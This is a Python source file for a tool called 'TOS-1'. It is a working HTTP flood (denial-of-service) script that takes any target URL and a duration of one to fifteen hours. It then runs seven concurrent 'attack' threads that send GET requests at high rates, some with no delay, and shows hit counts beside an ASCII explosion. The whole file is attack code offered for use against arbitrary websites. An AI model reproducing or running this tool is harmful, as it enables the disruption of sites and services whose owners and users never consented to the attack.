import time
import threading
import random
import os
import requests
from datetime import datetime

class TOS1:
    def __init__(self):
        self.target = ""
        self.duration = 0
        self.start_time = 0
        self.running = False
        
        # Statistics
        self.total_hits = 0
        self.total_intercepted = 0
        self.synx_v1_count = 0
        self.angry_v1_count = 0
        self.pkc_v1_count = 0
        self.shark_v1_count = 0
        self.tor_count = 0
        self.patriot_count = 0
        self.sts_hps_count = 0
        
        # Request session for connection pooling
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        
        # Thread control
        self.threads = []
        
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def display_header(self):
        print("\n" * 2)
        print(" " * 30 + "=" * 20)
        print(" " * 30 + "       TOS-1")
        print(" " * 30 + "=" * 20)
        print()
    
    def display_stats(self):
        elapsed = time.time() - self.start_time
        remaining = max(0, self.duration - elapsed)
        
        # Center the display
        padding = " " * 25
        
        print(padding + "=" * 50)
        print(padding + f"HITS - {self.total_hits:,}")
        print(padding + f"INTERCEPTED - {self.total_intercepted:,}")
        print(padding + "-" * 50)
        print(padding + f"SYNX-V1 - {self.synx_v1_count:,}")
        print(padding + f"ANGRY-V1 - {self.angry_v1_count:,}")
        print(padding + f"PKC-V1 - {self.pkc_v1_count:,}")
        print(padding + f"SHARK-V1 - {self.shark_v1_count:,}")
        print(padding + f"TOR - {self.tor_count:,}")
        print(padding + f"PATRIOT - {self.patriot_count:,}")
        print(padding + f"STS-HPS - {self.sts_hps_count:,}")
        print(padding + "-" * 50)
        print(padding + f"Elapsed: {int(elapsed)}s | Remaining: {int(remaining)}s")
        print(padding + "=" * 50)
    
    def display_explosion(self):
        # Simple ASCII explosion animation
        explosions = [
            "     .:!7?Y55PPGGGGP5YJ7!:.     ",
            "   :!J5GB##&&&&&&&&&&##BG5J!:   ",
            "  !5B&@@@@@@@@@@@@@@@@@@@@@&B5!  ",
            " :5&@@@@@@@@@@@@@@@@@@@@@@@@@&5: ",
            " J&@@@@@@@@@@@@@@@@@@@@@@@@@@@&J ",
            "?&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&?",
            "P@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@P",
            "G@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@G",
            "P@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@P",
            "?&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&?",
            " J&@@@@@@@@@@@@@@@@@@@@@@@@@@@&J ",
            " :5&@@@@@@@@@@@@@@@@@@@@@@@@@&5: ",
            "  !5B&@@@@@@@@@@@@@@@@@@@@&B5!  ",
            "   :!J5GB##&&&&&&&&&&##BG5J!:   ",
            "     .:!7?Y55PPGGGGP5YJ7!:.     "
        ]
        
        # Alternate between two explosion frames
        frame = int(time.time() * 3) % 2
        if frame == 0:
            explosions[7] = "G@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@B"
            explosions[8] = "B@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@G"
        
        padding = " " * 25
        for line in explosions:
            print(padding + line)
    
    def send_request(self, attack_name):
        """Send a real HTTP request to the target"""
        try:
            response = self.session.get(self.target, timeout=5)
            # Consider 4xx/5xx responses as intercepted
            if response.status_code >= 400:
                self.total_intercepted += 1
                return False
            return True
        except requests.exceptions.RequestException as e:
            # Connection errors, timeouts, etc. count as intercepted
            self.total_intercepted += 1
            return False
        except Exception:
            self.total_intercepted += 1
            return False
    
    def synx_v1_attack(self):
        while self.running:
            requests_sent = 0
            start_time = time.time()
            
            # Send 100 requests over 0.5 seconds
            while time.time() - start_time < 0.5 and self.running:
                if self.send_request("SYNX-V1"):
                    requests_sent += 1
                time.sleep(0.005)  # Small delay between requests
            
            self.synx_v1_count += requests_sent
            self.total_hits += requests_sent
            
            # Sleep remaining time if needed
            elapsed = time.time() - start_time
            if elapsed < 0.5:
                time.sleep(0.5 - elapsed)
    
    def angry_v1_attack(self):
        while self.running:
            requests_sent = 0
            start_time = time.time()
            
            # Send 500 requests over 0.3 seconds
            while time.time() - start_time < 0.3 and self.running:
                if self.send_request("ANGRY-V1"):
                    requests_sent += 1
                time.sleep(0.0006)  # Very small delay for high frequency
            
            self.angry_v1_count += requests_sent
            self.total_hits += requests_sent
            
            elapsed = time.time() - start_time
            if elapsed < 0.3:
                time.sleep(0.3 - elapsed)
    
    def pkc_v1_attack(self):
        while self.running:
            # Send 1 request every 1ms
            if self.send_request("PKC-V1"):
                self.pkc_v1_count += 1
                self.total_hits += 1
            
            time.sleep(0.001)  # 1ms delay
    
    def shark_v1_attack(self):
        while self.running:
            requests_sent = 0
            start_time = time.time()
            
            # Send 10 requests per ms (10,000 per second)
            while time.time() - start_time < 0.1 and self.running:  # Batch over 100ms
                if self.send_request("SHARK-V1"):
                    requests_sent += 1
                # No sleep for maximum speed
            
            self.shark_v1_count += requests_sent
            self.total_hits += requests_sent
            
            elapsed = time.time() - start_time
            if elapsed < 0.1:
                time.sleep(0.1 - elapsed)
    
    def tor_attack(self):
        while self.running:
            requests_sent = 0
            start_time = time.time()
            
            # Send 500 requests over 0.4 seconds
            while time.time() - start_time < 0.4 and self.running:
                if self.send_request("TOR"):
                    requests_sent += 1
                time.sleep(0.0008)
            
            self.tor_count += requests_sent
            self.total_hits += requests_sent
            
            elapsed = time.time() - start_time
            if elapsed < 0.4:
                time.sleep(0.4 - elapsed)
    
    def patriot_attack(self):
        last_burst_time = self.start_time
        while self.running:
            current_time = time.time()
            # Send 7500 requests every 59 seconds
            if current_time - last_burst_time >= 59:
                requests_sent = 0
                burst_start = time.time()
                
                # Send 7500 requests as fast as possible
                while requests_sent < 7500 and time.time() - burst_start < 5 and self.running:
                    if self.send_request("PATRIOT"):
                        requests_sent += 1
                
                self.patriot_count += requests_sent
                self.total_hits += requests_sent
                last_burst_time = current_time
            
            time.sleep(1)  # Check every second
    
    def sts_hps_attack(self):
        while self.running:
            requests_sent = 0
            start_time = time.time()
            
            # Send 100 requests (1/ms × 100) over 100ms
            while time.time() - start_time < 0.1 and self.running:
                if self.send_request("STS-HPS"):
                    requests_sent += 1
                time.sleep(0.001)  # 1ms delay
            
            self.sts_hps_count += requests_sent
            self.total_hits += requests_sent
            
            elapsed = time.time() - start_time
            if elapsed < 0.1:
                time.sleep(0.1 - elapsed)
    
    def start_attack(self):
        self.running = True
        self.start_time = time.time()
        
        # Start attack threads
        self.threads = [
            threading.Thread(target=self.synx_v1_attack),
            threading.Thread(target=self.angry_v1_attack),
            threading.Thread(target=self.pkc_v1_attack),
            threading.Thread(target=self.shark_v1_attack),
            threading.Thread(target=self.tor_attack),
            threading.Thread(target=self.patriot_attack),
            threading.Thread(target=self.sts_hps_attack)
        ]
        
        for thread in self.threads:
            thread.daemon = True
            thread.start()
        
        # Display loop
        while self.running and (time.time() - self.start_time) < self.duration:
            self.clear_screen()
            self.display_header()
            self.display_stats()
            self.display_explosion()
            time.sleep(0.1)
        
        # Stop the attack
        self.running = False
        
        # Wait for threads to finish
        for thread in self.threads:
            thread.join(timeout=1.0)
        
        # Final display
        self.clear_screen()
        self.display_header()
        self.display_stats()
        print("\n" + " " * 30 + "ATTACK COMPLETED!")
        print(" " * 30 + "=" * 20)
    
    def get_input(self):
        self.clear_screen()
        self.display_header()
        
        # Get target
        target = input(" " * 25 + "Enter TARGZ (target URL with http/https): ")
        if not target:
            print(" " * 25 + "Invalid target!")
            return False
        
        # Validate URL format
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        # Test connection
        try:
            test_response = requests.get(target, timeout=5)
            print(" " * 25 + f"Target is reachable (Status: {test_response.status_code})")
        except:
            print(" " * 25 + "Warning: Target may not be reachable")
        
        # Get duration
        try:
            duration = int(input(" " * 25 + "Enter DU (duration in seconds, 3600-54000): "))
            if duration < 3600 or duration > 54000:
                print(" " * 25 + "Duration must be between 3600 and 54000 seconds!")
                return False
        except ValueError:
            print(" " * 25 + "Invalid duration!")
            return False
        
        self.target = target
        self.duration = duration
        return True
    
    def run(self):
        if self.get_input():
            print("\n" + " " * 25 + f"Starting attack on {self.target} for {self.duration} seconds...")
            print(" " * 25 + "Press Ctrl+C to stop the attack")
            time.sleep(3)
            try:
                self.start_attack()
            except KeyboardInterrupt:
                self.running = False
                print("\n" + " " * 25 + "Attack stopped by user!")

if __name__ == "__main__":
    # Install requests if not available
    try:
        import requests
    except ImportError:
        print("Installing requests library...")
        os.system("pip install requests")
        import requests
    
    tester = TOS1()
    tester.run()
